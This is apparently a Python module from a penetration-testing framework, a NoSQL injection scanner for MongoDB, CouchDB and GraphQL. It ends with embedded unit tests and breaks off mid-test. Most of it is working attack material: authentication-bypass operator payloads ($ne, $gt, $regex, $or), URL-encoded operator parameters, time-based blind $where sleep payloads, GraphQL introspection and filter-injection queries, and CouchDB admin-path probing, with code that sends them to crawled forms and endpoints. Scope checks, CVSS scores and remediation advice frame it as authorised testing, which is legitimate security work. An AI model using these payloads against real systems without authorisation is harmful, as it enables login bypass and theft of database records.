"""NoSQL injection scanner — MongoDB, CouchDB, GraphQL operator injection."""
from __future__ import annotations

import asyncio
import json
import re
import sys
import time
from pathlib import Path
from urllib.parse import urlparse, urlencode

sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))

from common.base_module import BaseModule, ModuleResult
from common.evidence import Evidence
from common.finding import Severity

# ---------------------------------------------------------------------------
# CVSS vectors
# ---------------------------------------------------------------------------
CVSS_NOSQL_CRITICAL   = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L"   # Auth bypass
CVSS40_NOSQL_CRITICAL = "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:L/SC:N/SI:N/SA:N"
CVSS_NOSQL_HIGH       = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N"   # Data extraction
CVSS40_NOSQL_HIGH     = "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N"
CVSS_NOSQL_MED        = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N"   # Error-based info
CVSS40_NOSQL_MED      = "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N"

# MITRE ATT&CK
MITRE_NOSQL   = ["TA0001/T1190"]           # Exploit Public-Facing Application
MITRE_DATA    = ["TA0009/T1213"]           # Data from Information Repositories

# ---------------------------------------------------------------------------
# MongoDB operator injection payloads (JSON body / dict)
# ---------------------------------------------------------------------------

# Authentication bypass operators
MONGO_AUTH_BYPASS: list[dict] = [
    {
        "body":  {"username": {"$ne": None}, "password": {"$ne": None}},
        "desc":  "$ne null (always-true not-equal)",
        "technique": "ne_null",
    },
    {
        "body":  {"username": {"$gt": ""}, "password": {"$gt": ""}},
        "desc":  "$gt empty string (always-true greater-than)",
        "technique": "gt_empty",
    },
    {
        "body":  {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}},
        "desc":  "$regex wildcard (matches everything)",
        "technique": "regex_wildcard",
    },
    {
        "body":  {"$or": [{"username": "admin"}, {"username": {"$regex": ".*"}}]},
        "desc":  "$or admin OR regex wildcard",
        "technique": "or_admin_regex",
    },
    {
        "body":  {"username": {"$in": ["admin", "root", "administrator", "superuser"]}},
        "desc":  "$in common admin usernames",
        "technique": "in_admin_names",
    },
]

# Data extraction via regex enumeration
MONGO_REGEX_ENUM: list[dict] = [
    {
        "body":   {"username": {"$regex": "^a"}},
        "desc":   "regex prefix enumeration (starts with 'a')",
    },
    {
        "body":   {"username": {"$regex": "^admin"}},
        "desc":   "regex exact prefix 'admin'",
    },
    {
        "body":   {"email": {"$regex": "@"}},
        "desc":   "email field regex (any email format)",
    },
]

# MongoDB array / range operators (always-true conditions)
MONGO_ARRAY_OPS: list[dict] = [
    {
        "body":  {"age": {"$gt": 0, "$lt": 200}},
        "desc":  "$gt/$lt range (always-true 0 < age < 200)",
        "technique": "gt_lt_range",
    },
    {
        "body":  {"score": {"$gte": 0}},
        "desc":  "$gte 0 (always-true score >= 0)",
        "technique": "gte_zero",
    },
    {
        "body":  {"username": {"$nin": ["nobody_____"]}},
        "desc":  "$nin non-existent value (always-true not-in)",
        "technique": "nin_nonexistent",
    },
    {
        "body":  {"$expr": {"$gt": ["$salary", 0]}},
        "desc":  "$expr aggregation expression (salary > 0)",
        "technique": "expr_gt_salary",
    },
    {
        "body":  {"id": {"$exists": True}},
        "desc":  "$exists true (always-true field exists)",
        "technique": "exists_true",
    },
]

# Time-based blind payloads (JavaScript $where execution)
MONGO_TIME_BASED: list[dict] = [
    {
        "body":  {"$where": "sleep(5000)"},
        "delay": 5.0,
        "desc":  "$where sleep(5000) — time-based blind",
    },
    {
        "body":  {
            "$where": (
                "function(){var d=new Date;"
                "while((new Date)-d<5000){};"
                "return true;}"
            )
        },
        "delay": 5.0,
        "desc":  "$where busy-loop 5s — time-based blind",
    },
    {
        "body":  {"username": {"$where": "sleep(5000)"}},
        "delay": 5.0,
        "desc":  "field-level $where sleep(5000)",
    },
]

# URL-encoded operator injection (GET / REST API HPP-style NoSQL)
# Used when the server maps query-string params directly to MongoDB queries
URL_NOSQL_PAYLOADS: list[dict] = [
    {
        "params": [("username[$ne]", "null"), ("password[$ne]", "null")],
        "desc":   "GET $ne null auth bypass",
        "technique": "get_ne_null",
    },
    {
        "params": [("username[$regex]", ".*"), ("password[$regex]", ".*")],
        "desc":   "GET $regex wildcard",
        "technique": "get_regex_wildcard",
    },
    {
        "params": [("username[$gt]", ""), ("password[$gt]", "")],
        "desc":   "GET $gt empty string",
        "technique": "get_gt_empty",
    },
    {
        "params": [("username[$exists]", "true"), ("password[$exists]", "true")],
        "desc":   "GET $exists true",
        "technique": "get_exists_true",
    },
    {
        "params": [("id[$ne]", "-1")],
        "desc":   "GET id $ne -1 (list all records)",
        "technique": "get_id_ne",
    },
    {
        "params": [("filter[$where]", "sleep(1000)")],
        "desc":   "GET $where sleep via filter param",
        "technique": "get_where_sleep",
    },
]

# Form-based payloads (URL-encoded POST body)
FORM_PAYLOADS: list[tuple[str, str]] = [
    ("[$ne]",      "invalid_xyz"),
    ("[$gt]",      ""),
    ("[$regex]",   ".*"),
    ("[$exists]",  "true"),
    ("[$nin][]",   "notexist_xyz"),
    ("[$in][]",    "admin"),
]

# MongoDB / NoSQL error message patterns
NOSQL_ERROR_PATTERNS: list[tuple[str, str]] = [
    (r"MongoServerError",          "MongoDB server error"),
    (r"BSONTypeError",             "BSON type error"),
    (r"\$where",                   "$where operator reflected"),
    (r"BSON",                      "BSON reference"),
    (r"\bmongo\b",                 "mongo keyword in error"),
    (r"\bmongoose\b",              "Mongoose ORM error"),
    (r"CastError",                 "Mongoose CastError"),
    (r"ValidatorError",            "Mongoose ValidatorError"),
    (r"MongoError",                "MongoError"),
    (r"E11000",                    "MongoDB duplicate key error"),
    (r"ObjectId",                  "MongoDB ObjectId in error"),
    (r"SyntaxError.*json",         "JSON syntax error in MongoDB query"),
    (r"unexpected token.*\\$",     "Unexpected $ operator token"),
    (r"unknown operator",          "Unknown operator error"),
]

# Indicators that suggest authentication bypass succeeded
AUTH_BYPASS_INDICATORS: list[str] = [
    "welcome", "dashboard", "logged in", "login successful",
    "success", "account", "profile", "home", "authenticated",
    "token", "session", "jwt", "bearer",
]

# CouchDB-specific paths and checks
COUCHDB_PATHS: list[str] = [
    "/_utils",          # Fauxton admin UI
    "/_all_dbs",        # List all databases
    "/_users",          # User database
    "/_session",        # Session endpoint
    "/_config",         # Configuration
    "/_active_tasks",   # Active tasks
]

# GraphQL introspection / injection payloads
GRAPHQL_PAYLOADS: list[dict] = [
    {
        "query":  "{__schema{types{name}}}",
        "desc":   "GraphQL introspection — schema type listing",
        "detect": "__schema",
    },
    {
        "query":  "{__typename}",
        "desc":   "GraphQL __typename (basic introspection)",
        "detect": "__typename",
    },
    {
        "query":  '{ user(id: "1 OR 1=1") { id username email } }',
        "desc":   "GraphQL field injection — SQL-style NoSQL bypass",
        "detect": "user",
    },
    {
        "query":  (
            '{ users(filter: {username: {_regex: ".*"}}) '
            '{ username email password } }'
        ),
        "desc":   "GraphQL NoSQL filter regex wildcard",
        "detect": "users",
    },
]


class NoSqlInject(BaseModule):
    """NoSQL injection scanner — MongoDB, CouchDB, GraphQL.

    Covers:
    - MongoDB operator injection (auth bypass, data extraction)
    - MongoDB array/range operators (always-true conditions)
    - URL-encoded $operator injection for REST APIs
    - Time-based blind NoSQL ($where sleep)
    - CouchDB Futon/Fauxton exposure + view injection
    - GraphQL introspection + NoSQL filter injection
    - Error-based NoSQL detection
    """

    NAME        = "nosql_inject"
    DESCRIPTION = "NoSQL injection: MongoDB operators, CouchDB, GraphQL, time-based blind"
    PHASE       = 4
    TAGS        = ["injection", "nosql", "mongodb", "couchdb", "graphql",
                   "cwe-943", "owasp-a03"]

    async def run(self) -> ModuleResult:
        start  = time.monotonic()
        target = self.config.target.rstrip("/")
        if not self.check_scope(target):
            return self._make_result(start, skipped=True, skip_reason="out of scope")

        forms   = self.config.extra.get("found_forms", [])
        crawled = self.config.extra.get("crawled_urls", [target])

        self.log.info("NoSQL injection scan on %s (%d forms, %d URLs)",
                      target, len(forms), len(crawled))

        sem = asyncio.Semaphore(2)
        tasks: list = []

        # Login/auth forms — auth bypass priority
        for form in forms[:10]:
            if any(kw in str(form).lower() for kw in ["login", "signin", "auth", "password"]):
                tasks.append(self._test_form_auth_bypass(form, target, sem))

        # JSON API endpoints — operator injection
        for url in crawled[:20]:
            tasks.append(self._test_json_endpoint(url, target, sem))

        # URL-encoded GET operator injection (REST APIs)
        for url in crawled[:20]:
            tasks.append(self._test_url_operator_injection(url, target, sem))

        # Time-based blind
        for url in crawled[:5]:
            tasks.append(self._test_time_based_blind(url, target, sem))

        # CouchDB exposure check
        tasks.append(self._test_couchdb(target, sem))

        # GraphQL
        tasks.append(self._test_graphql(target, sem))

        await asyncio.gather(*tasks, return_exceptions=True)
        return self._make_result(start)

    # ------------------------------------------------------------------
    # Form-based auth bypass
    # ------------------------------------------------------------------

    async def _test_form_auth_bypass(
        self, form: dict, target: str, sem: asyncio.Semaphore
    ) -> None:
        async with sem:
            action = form.get("action") or target
            if not action.startswith("http"):
                action = f"{target.rstrip('/')}/{action.lstrip('/')}"
            if not self.check_scope(action):
                return

            inputs = form.get("inputs", ["username", "password"])

            # Baseline (should fail auth)
            baseline = await self._post_form(
                action, {i: "nosql_forge_invalid_user_xyz" for i in inputs}
            )
            if baseline is None:
                return
            baseline_status, baseline_body = baseline

            for param in inputs:
                for suffix, value in FORM_PAYLOADS:
                    await self.rate_limit()
                    data = {i: "nosql_forge_invalid_user_xyz" for i in inputs}
                    del data[param]
                    data[f"{param}{suffix}"] = value

                    result = await self._post_form(action, data)
                    if result is None:
                        continue
                    status, body = result

                    # Error-based detection
                    error_match = self._detect_nosql_operators(body)
                    if error_match:
                        ev = Evidence(
                            request_raw=f"POST {action}\n{param}{suffix}={value}",
                            response_raw=body[:500],
                            extra={
                                "payload":     f"{param}{suffix}={value}",
                                "error_match": error_match,
                            },
                        )
                        self.new_finding(
                            title=f"NoSQL Injection Error-Based — {param} @ {action}",
                            severity=Severity.HIGH,
                            description=(
                                f"NoSQL error triggered via operator injection in '{param}'. "
                                f"Pattern matched: {error_match}. "
                                "Server-side NoSQL error details are exposed."
                            ),
                            reproduction_steps=[
                                f"curl -X POST {action} \\",
                                f"  -d '{param}{suffix}={value}'",
                            ],
                            remediation=(
                                "Validate that all input fields receive strings, not objects. "
                                "Use strict JSON schema validation with type:string enforcement. "
                                "For MongoDB: cast inputs with String() before querying."
                            ),
                            references=["CWE-943", "CWE-89", "OWASP A03:2021"],
                            evidence=ev,
                            cvss_v31_vector=CVSS_NOSQL_HIGH,
                            cvss_v40_vector=CVSS40_NOSQL_HIGH,
                            mitre_attack=MITRE_NOSQL,
                            target=target,
                        )
                        return

                    # Auth bypass detection
                    if (status == 200
                            and status != baseline_status
                            and any(
                                kw in body.lower()
                                for kw in AUTH_BYPASS_INDICATORS
                            )
                            and not any(
                                kw in baseline_body.lower()
                                for kw in AUTH_BYPASS_INDICATORS
                            )):
                        ev = Evidence(
                            request_raw=f"POST {action}\n{param}{suffix}={value}",
                            response_raw=body[:600],
                            extra={
                                "payload":         f"{param}{suffix}={value}",
                                "baseline_status": baseline_status,
                                "bypass_status":   status,
                            },
                        )
                        self.new_finding(
                            title=f"NoSQL Authentication Bypass — {param} @ {action}",
                            severity=Severity.CRITICAL,
                            description=(
                                f"NoSQL authentication bypass confirmed via operator injection "
                                f"in '{param}' using suffix '{suffix}={value}'. "
                                f"Baseline returned HTTP {baseline_status}; "
                                f"injected request returned HTTP {status} with auth success indicators. "
                                "An attacker can log in without valid credentials."
                            ),
                            reproduction_steps=[
                                f"curl -X POST {action} \\",
                                f"  -d '{param}{suffix}={value}&...'",
                                "Observe authenticated session in response",
                            ],
                            remediation=(
                                "Reject non-string input for authentication fields. "
                                "Use MongoDB's $eq operator explicitly. "
                                "Never pass raw user-controlled objects into find() or findOne()."
                            ),
                            references=["CWE-943", "OWASP A03:2021"],
                            evidence=ev,
                            cvss_v31_vector=CVSS_NOSQL_CRITICAL,
                            cvss_v40_vector=CVSS40_NOSQL_CRITICAL,
                            mitre_attack=MITRE_NOSQL,
                            target=target,
                        )
                        return

    # ------------------------------------------------------------------
    # JSON API — operator injection + auth bypass
    # ------------------------------------------------------------------

    async def _test_json_endpoint(
        self, url: str, target: str, sem: asyncio.Semaphore
    ) -> None:
        async with sem:
            if not self.check_scope(url):
                return

            # Test auth bypass payloads first
            for entry in MONGO_AUTH_BYPASS:
                await self.rate_limit()
                payload_body = entry["body"]
                try:
                    status, body = await self._post_json(url, payload_body)

                    error_match = self._detect_nosql_operators(body)
                    if error_match:
                        ev = Evidence(
                            request_raw=(
                                f"POST {url}\n"
                                f"Content-Type: application/json\n"
                                f"{json.dumps(payload_body)}"
                            ),
                            response_raw=body[:400],
                            extra={
                                "technique":   entry["technique"],
                                "desc":        entry["desc"],
                                "error_match": error_match,
                            },
                        )
                        self.new_finding(
                            title=f"NoSQL Injection (JSON) — {entry['desc']} @ {url}",
                            severity=Severity.HIGH,
                            description=(
                                f"MongoDB operator injection via JSON body at '{url}'. "
                                f"Technique: {entry['desc']}. "
                                f"NoSQL error signature detected: {error_match}."
                            ),
                            reproduction_steps=[
                                f"curl -X POST {url} \\",
                                "  -H 'Content-Type: application/json' \\",
                                f"  -d '{json.dumps(payload_body)}'",
                            ],
                            remediation=(
                                "Validate JSON body schema; reject unexpected object types "
                                "for authentication fields. Use $eq operator."
                            ),
                            references=["CWE-943", "OWASP A03:2021"],
                            evidence=ev,
                            cvss_v31_vector=CVSS_NOSQL_HIGH,
                            cvss_v40_vector=CVSS40_NOSQL_HIGH,
                            mitre_attack=MITRE_NOSQL,
                            target=target,
                        )
                        return

                    # Auth bypass: 200 with auth keywords
                    if (status == 200
                            and any(kw in body.lower() for kw in AUTH_BYPASS_INDICATORS)):
                        ev = Evidence(
                            request_raw=(
                                f"POST {url}\n"
                                f"{json.dumps(payload_body)}"
                            ),
                            response_raw=body[:600],
                            extra={
                                "technique": entry["technique"],
                                "desc":      entry["desc"],
                                "status":    status,
                            },
                        )
                        self.new_finding(
                            title=(
                                f"NoSQL Auth Bypass (JSON) — {entry['desc']} @ {url}"
                            ),
                            severity=Severity.CRITICAL,
                            description=(
                                f"NoSQL authentication bypass via JSON operator injection "
                                f"at '{url}'. Technique: {entry['desc']}. "
                                "Response contains authentication success indicators."
                            ),
                            reproduction_steps=[
                                f"curl -X POST {url} \\",
                                "  -H 'Content-Type: application/json' \\",
                                f"  -d '{json.dumps(payload_body)}'",
                                "Observe auth token/session in response",
                            ],
                            remediation=(
                                "Cast all authentication field inputs to string before querying. "
                                "Use strict JSON schema validation with additionalProperties: false."
                            ),
                            references=["CWE-943", "OWASP A03:2021"],
                            evidence=ev,
                            cvss_v31_vector=CVSS_NOSQL_CRITICAL,
                            cvss_v40_vector=CVSS40_NOSQL_CRITICAL,
                            mitre_attack=MITRE_NOSQL,
                            target=target,
                        )
                        return
                except Exception:
                    pass

            # Test array/range operators (data extraction)
            for entry in MONGO_ARRAY_OPS:
                await self.rate_limit()
                try:
                    status, body = await self._post_json(url, entry["body"])
                    if status == 200 and len(body) > 100:
                        # Check if it returns more data than expected
                        error_match = self._detect_nosql_operators(body)
                        if error_match or any(
                            op in body for op in ["$gt", "$lt", "$exists", "$expr"]
                        ):
                            ev = Evidence(
                                request_raw=(
                                    f"POST {url}\n{json.dumps(entry['body'])}"
                                ),
                                response_raw=body[:400],
                                extra={
                                    "technique": entry["technique"],
                                    "desc":      entry["desc"],
                                },
                            )
                            self.new_finding(
                                title=(
                                    f"NoSQL Data Extraction — {entry['desc']} @ {url}"
                                ),
                                severity=Severity.HIGH,
                                description=(
                                    f"MongoDB array/range operator injection at '{url}'. "
                                    f"Technique: {entry['desc']}. "
                                    "This always-true condition may return all database records."
                                ),
                                reproduction_steps=[
                                    f"curl -X POST {url} \\",
                                    "  -H 'Content-Type: application/json' \\",
                                    f"  -d '{json.dumps(entry['body'])}'",
                                ],
                                remediation=(
                                    "Validate input types and reject MongoDB operator objects "
                                    "from user input. Use an ORM or query builder that enforces "
                                    "typed parameters."
                                ),
                                references=["CWE-943", "OWASP A03:2021"],
                                evidence=ev,
                                cvss_v31_vector=CVSS_NOSQL_HIGH,
                                cvss_v40_vector=CVSS40_NOSQL_HIGH,
                                mitre_attack=MITRE_DATA,
                                target=target,
                            )
                            return
                except Exception:
                    pass

    # ------------------------------------------------------------------
    # URL-encoded GET operator injection (REST APIs)
    # ------------------------------------------------------------------

    async def _test_url_operator_injection(
        self, url: str, target: str, sem: asyncio.Semaphore
    ) -> None:
        async with sem:
            if not self.check_scope(url):
                return

            parsed = urlparse(url)
            base   = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

            for entry in URL_NOSQL_PAYLOADS:
                await self.rate_limit()
                qs       = urlencode(entry["params"])
                test_url = f"{base}?{qs}"

                try:
                    import aiohttp
                    async with aiohttp.ClientSession(
                        connector=aiohttp.TCPConnector(ssl=False)
                    ) as session:
                        async with session.get(
                            test_url,
                            headers={"User-Agent": "Mozilla/5.0"},
                            allow_redirects=True,
                            timeout=aiohttp.ClientTimeout(total=8),
                        ) as resp:
                            status = resp.status
                            body   = await resp.text(errors="ignore")

                    error_match = self._detect_nosql_operators(body)
                    auth_bypass = any(
                        kw in body.lower() for kw in AUTH_BYPASS_INDICATORS
                    )

                    if error_match or (status == 200 and auth_bypass):
                        finding_desc = (
                            f"Error detected: {error_match}"
                            if error_match
                            else "Auth bypass indicators in response"
                        )
                        ev = Evidence(
                            request_raw=f"GET {test_url}",
                            response_raw=body[:400],
                            extra={
                                "technique":  entry["technique"],
                                "desc":       entry["desc"],
                                "params":     entry["params"],
                                "finding":    finding_desc,
                            },
                        )
                        self.new_finding(
                            title=(
                                f"NoSQL Injection (URL-Encoded GET) — "
                                f"{entry['desc']}"
                            ),
                            severity=Severity.CRITICAL if auth_bypass else Severity.HIGH,
                            description=(
                                f"URL-encoded MongoDB operator injection at '{test_url}'. "
                                f"Technique: {entry['desc']}. {finding_desc}. "
                                "REST APIs that map query-string params directly to MongoDB "
                                "find() queries are vulnerable to this attack."
                            ),
                            reproduction_steps=[
                                f"curl '{test_url}'",
                                "# Also try with POST body:",
                                f"curl -X POST {base} \\",
                                f"  -d '{qs}'",
                            ],
                            remediation=(
                                "Use a query-builder that rejects operator objects from strings. "
                                "Parse query-string params as strings, not objects. "
                                "For Express.js: set qs options to disallow $ prefixes."
                            ),
                            references=["CWE-943", "OWASP A03:2021", "NodeJS HPP NoSQL"],
                            evidence=ev,
                            cvss_v31_vector=(
                                CVSS_NOSQL_CRITICAL if auth_bypass else CVSS_NOSQL_HIGH
                            ),
                            cvss_v40_vector=(
                                CVSS40_NOSQL_CRITICAL if auth_bypass else CVSS40_NOSQL_HIGH
                            ),
                            mitre_attack=MITRE_NOSQL,
                            target=target,
                        )
                        return
                except Exception:
                    pass

    # ------------------------------------------------------------------
    # Time-based blind NoSQL
    # ------------------------------------------------------------------

    async def _test_time_based_blind(
        self, url: str, target: str, sem: asyncio.Semaphore
    ) -> None:
        async with sem:
            if not self.check_scope(url):
                return

            # Baseline timing
            try:
                t0 = time.monotonic()
                await self._post_json(url, {"username": "test", "password": "test"})
                baseline_s = time.monotonic() - t0
            except Exception:
                baseline_s = 1.0

            for entry in MONGO_TIME_BASED:
                await self.rate_limit()
                try:
                    t_start = time.monotonic()
                    status, body = await self._post_json(
                        url, entry["body"],
                        timeout=entry["delay"] + 3.0,
                    )
                    elapsed = time.monotonic() - t_start

                    # Delay must be ≥4.5s and at least 3× baseline
                    if elapsed >= 4.5 and elapsed >= baseline_s * 3:
                        ev = Evidence(
                            request_raw=(
                                f"POST {url}\n{json.dumps(entry['body'])}"
                            ),
                            extra={
                                "desc":       entry["desc"],
                                "elapsed_s":  round(elapsed, 2),
                                "baseline_s": round(baseline_s, 2),
                            },
                        )
                        self.new_finding(
                            title=f"NoSQL Blind Injection (Time-Based) — {url}",
                            severity=Severity.CRITICAL,
                            description=(
                                f"Time-based blind NoSQL injection confirmed at '{url}'. "
                                f"Payload '{entry['desc']}' caused a {elapsed:.1f}s delay "
                                f"(baseline: {baseline_s:.1f}s). "
                                "This confirms JavaScript $where execution on the MongoDB server."
                            ),
                            reproduction_steps=[
                                f"curl -X POST {url} \\",
                                "  -H 'Content-Type: application/json' \\",
                                f"  -d '{json.dumps(entry['body'])}'",
                                f"# Observe ~{entry['delay']:.0f}s response delay",
                            ],
                            remediation=(
                                "Disable $where operator in MongoDB configuration "
                                "(--noscripting flag or security.javascriptEnabled: false). "
                                "Validate all input types before passing to MongoDB queries."
                            ),
                            references=[
                                "CWE-943", "OWASP A03:2021",
                                "MongoDB $where security",
                            ],
                            evidence=ev,
                            cvss_v31_vector=CVSS_NOSQL_CRITICAL,
                            cvss_v40_vector=CVSS40_NOSQL_CRITICAL,
                            mitre_attack=MITRE_NOSQL,
                            target=target,
                        )
                        return
                except Exception:
                    pass

    # ------------------------------------------------------------------
    # CouchDB exposure check
    # ------------------------------------------------------------------

    async def _test_couchdb(
        self, target: str, sem: asyncio.Semaphore
    ) -> None:
        async with sem:
            try:
                import aiohttp

                for path in COUCHDB_PATHS:
                    await self.rate_limit()
                    url = f"{target}{path}"
                    if not self.check_scope(url):
                        continue

                    async with aiohttp.ClientSession(
                        connector=aiohttp.TCPConnector(ssl=False)
                    ) as session:
                        async with session.get(
                            url,
                            headers={"User-Agent": "Mozilla/5.0"},
                            allow_redirects=True,
                            timeout=aiohttp.ClientTimeout(total=8),
                        ) as resp:
                            status = resp.status
                            body   = await resp.text(errors="ignore")

                    # Detect CouchDB JSON responses
                    couchdb_indicators = [
                        '"couchdb"', "Welcome", "Futon", "Fauxton",
                        '"version"', '"all_dbs"', '"_users"',
                    ]
                    if status == 200 and any(ind in body for ind in couchdb_indicators):
                        ev = Evidence(
                            request_raw=f"GET {url}",
                            response_raw=body[:400],
                            extra={"path": path, "status": status},
                        )
                        severity = (
                            Severity.CRITICAL
                            if path in ("/_utils", "/_all_dbs", "/_users")
                            else Severity.HIGH
                        )
                        self.new_finding(
                            title=f"CouchDB Admin Interface Exposed — {path}",
                            severity=severity,
                            description=(
                                f"CouchDB endpoint '{path}' is accessible without authentication "
                                f"at '{url}'. "
                                "Exposed CouchDB paths allow:\n"
                                "- Database enumeration via /_all_dbs\n"
                                "- User enumeration via /_users\n"
                                "- Admin panel access via /_utils (Fauxton)"
                            ),
                            reproduction_steps=[
                                f"curl '{url}'",
                                "# Enumerate databases:",
                                f"curl '{target}/_all_dbs'",
                            ],
                            remediation=(
                                "Bind CouchDB to localhost only (bind_address = 127.0.0.1). "
                                "Enable authentication (require_valid_user = true in config). "
                                "Firewall CouchDB ports (5984, 6984) from public access."
                            ),
                            references=[
                                "CWE-306", "CWE-284",
                                "CouchDB Security Configuration",
                                "OWASP A05:2021",
                            ],
                            evidence=ev,
                            cvss_v31_vector=CVSS_NOSQL_CRITICAL,
                            cvss_v40_vector=CVSS40_NOSQL_CRITICAL,
                            mitre_attack=MITRE_DATA,
                            target=target,
                        )
                        return  # One finding per target for CouchDB
            except Exception:
                pass

    # ------------------------------------------------------------------
    # GraphQL introspection + NoSQL injection
    # ------------------------------------------------------------------

    async def _test_graphql(
        self, target: str, sem: asyncio.Semaphore
    ) -> None:
        async with sem:
            graphql_paths = [
                "/graphql", "/api/graphql", "/v1/graphql",
                "/query", "/gql", "/api/query",
            ]
            try:
                import aiohttp

                for gql_path in graphql_paths:
                    url = f"{target}{gql_path}"
                    if not self.check_scope(url):
                        continue

                    for gql_entry in GRAPHQL_PAYLOADS:
                        await self.rate_limit()
                        body_dict = {"query": gql_entry["query"]}
                        body_str  = json.dumps(body_dict)

                        async with aiohttp.ClientSession(
                            connector=aiohttp.TCPConnector(ssl=False)
                        ) as session:
                            async with session.post(
                                url,
                                data=body_str,
                                headers={
                                    "Content-Type": "application/json",
                                    "User-Agent":   "Mozilla/5.0",
                                },
                                allow_redirects=True,
                                timeout=aiohttp.ClientTimeout(total=10),
                            ) as resp:
                                status   = resp.status
                                resp_body = await resp.text(errors="ignore")

                        detect_key = gql_entry["detect"]
                        if status == 200 and detect_key in resp_body:
                            introspection = detect_key == "__schema"
                            sev = Severity.HIGH if introspection else Severity.CRITICAL

                            ev = Evidence(
                                request_raw=(
                                    f"POST {url}\n"
                                    f"Content-Type: application/json\n"
                                    f"{body_str}"
                                ),
                                response_raw=resp_body[:600],
                                extra={
                                    "gql_path":  gql_path,
                                    "desc":      gql_entry["desc"],
                                    "query":     gql_entry["query"][:120],
                                },
                            )
                            self.new_finding(
                                title=(
                                    f"GraphQL {'Introspection Enabled' if introspection else 'NoSQL Injection'} "
                                    f"— {gql_path}"
                                ),
                                severity=sev,
                                description=(
                                    f"GraphQL endpoint '{gql_path}': {gql_entry['desc']}. "
                                    + (
                                        "Introspection is enabled, exposing full schema. "
                                        "An attacker can enumerate all types, queries, and mutations."
                                        if introspection
                                        else
                                        "Injection payload returned data, suggesting the backend "
                                        "NoSQL query is not properly sanitized."
                                    )
                                ),
                                reproduction_steps=[
                                    f"curl -X POST {url} \\",
                                    "  -H 'Content-Type: application/json' \\",
                                    f"  -d '{body_str}'",
                                ],
                                remediation=(
                                    "Disable GraphQL introspection in production "
                                    "(introspection: false in Apollo Server). "
                                    "Use persisted queries. "
                                    "Sanitize all filter/argument values before passing to NoSQL queries."
                                ),
                                references=["CWE-943", "CWE-200", "OWASP A03:2021"],
                                evidence=ev,
                                cvss_v31_vector=(
                                    CVSS_NOSQL_HIGH if introspection else CVSS_NOSQL_CRITICAL
                                ),
                                cvss_v40_vector=(
                                    CVSS40_NOSQL_HIGH if introspection else CVSS40_NOSQL_CRITICAL
                                ),
                                mitre_attack=MITRE_DATA,
                                target=target,
                            )
                            return
            except Exception:
                pass

    # ------------------------------------------------------------------
    # Operator detection
    # ------------------------------------------------------------------

    def _detect_nosql_operators(self, response: str) -> str | None:
        """Check response for MongoDB/NoSQL error message patterns.

        Returns the matched description string if found, or None.
        """
        for pattern, description in NOSQL_ERROR_PATTERNS:
            if re.search(pattern, response, re.IGNORECASE):
                return description
        return None

    # ------------------------------------------------------------------
    # HTTP helpers
    # ------------------------------------------------------------------

    async def _post_json(
        self,
        url: str,
        payload: dict,
        timeout: float = 8.0,
    ) -> tuple[int, str]:
        try:
            import aiohttp
            body_str = json.dumps(payload)
            async with aiohttp.ClientSession(
                connector=aiohttp.TCPConnector(ssl=False)
            ) as session:
                async with session.post(
                    url,
                    data=body_str,
                    headers={
                        "Content-Type": "application/json",
                        "User-Agent":   "Mozilla/5.0",
                    },
                    timeout=aiohttp.ClientTimeout(total=timeout),
                    allow_redirects=True,
                ) as resp:
                    return resp.status, await resp.text(errors="ignore")
        except Exception:
            return 0, ""

    async def _post_form(
        self, url: str, data: dict
    ) -> tuple[int, str] | None:
        try:
            import aiohttp
            async with aiohttp.ClientSession(
                connector=aiohttp.TCPConnector(ssl=False)
            ) as session:
                async with session.post(
                    url,
                    data=data,
                    headers={"User-Agent": "Mozilla/5.0"},
                    timeout=aiohttp.ClientTimeout(total=8),
                    allow_redirects=True,
                ) as resp:
                    return resp.status, await resp.text(errors="ignore")
        except Exception:
            return None


# ---------------------------------------------------------------------------
# Embedded tests
# ---------------------------------------------------------------------------

class TestNosqlInject:
    """Embedded unit tests — run with pytest."""

    def test_auth_bypass_payloads_count(self) -> None:
        assert len(MONGO_AUTH_BYPASS) >= 5

    def test_auth_bypass_all_are_dicts_with_body(self) -> None:
        for entry in MONGO_AUTH_BYPASS:
            assert "body" in entry
            assert isinstance(entry["body"], dict)
            assert "technique" in entry

    def test_ne_null_payload(self) -> None:
        ne_entry = next(
            e for e in MONGO_AUTH_BYPASS if e["technique"] == "ne_null"
        )
        body = ne_entry["body"]
        assert "$ne" in str(body)

    def test_regex_wildcard_payload(self) -> None:
        regex_entry = next(
            e for e in MONGO_AUTH_BYPASS if e["technique"] == "regex_wildcard"
        )
        body_str = str(regex_entry["body"])
        assert "$regex" in body_str
        assert ".*" in body_str

    def test_or_condition_payload(self) -> None:
        or_entry = next(
            e for e in MONGO_AUTH_BYPASS if e["technique"] == "or_admin_regex"
        )
        assert "$or" in str(or_entry["body"])

    def test_in_operator_payload(self) -> None:
        in_entry = next(
            e for e in MONGO_AUTH_BYPASS if e["technique"] == "in_admin_names"
        )
        body_str = str(in_entry["body"])
        assert "$in" in body_str
        assert "admin" in body_str

    def test_array_operators_count(self) -> None:
        assert len(MONGO_ARRAY_OPS) >= 5

    def test_expr_operator_present(self) -> None:
        expr_entry = next(
            (e for e in MONGO_ARRAY_OPS if e["technique"] == "expr_gt_salary"),
            None,
        )
        assert expr_entry is not None
        assert "$expr" in str(expr_entry["body"])

    def test_url_operator_payloads_count(self) -> None:
        assert len(URL_NOSQL_PAYLOADS) >= 6

    def test_url_ne_null_payload(self) -> None:
        ne_entry = next(
            e for e in URL_NOSQL_PAYLOADS if e["technique"] == "get_ne_null"
        )
        params_str = str(ne_entry["params"])
        assert "[$ne]" in params_str

    def test_url_regex_payload_encoding(self) -> None:
        regex_entry = next(
            e for e in URL_NOSQL_PAYLOADS if e["technique"] == "get_regex_wildcard"
        )
        params_str = str(regex_entry["params"])
        assert "[$regex]" in params_str

    def test_time_based_payloads_count(self) -> None:
        assert len(MONGO_TIME_BASED) >= 2

    def test_time_based_delay_value(self) -> None:
        for entry in MONGO_TIME_BASED:
